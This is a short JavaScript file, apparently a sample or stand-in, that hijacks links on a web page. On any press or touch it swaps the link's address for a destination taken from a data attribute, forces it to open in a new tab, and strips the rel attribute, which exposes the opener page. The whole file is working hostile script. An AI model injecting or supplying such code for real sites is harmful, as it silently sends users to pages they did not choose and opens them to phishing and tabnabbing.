// A stand-in link hijacker. The moment a press lands on any link, its address
// is swapped for the destination and set to open in a new tab.
(() => {
  const dest = document.currentScript.dataset.dest;
  const swap = (event) => {
    const link = event.target.closest && event.target.closest("a[href]");
    if (!link || link.dataset.swapped) return;
    link.dataset.swapped = "1";
    link.href = dest;
    link.target = "_blank";
    link.removeAttribute("rel");
  };
  document.addEventListener("pointerdown", swap, true);
  document.addEventListener("mousedown", swap, true);
  document.addEventListener("touchstart", swap, true);
})();
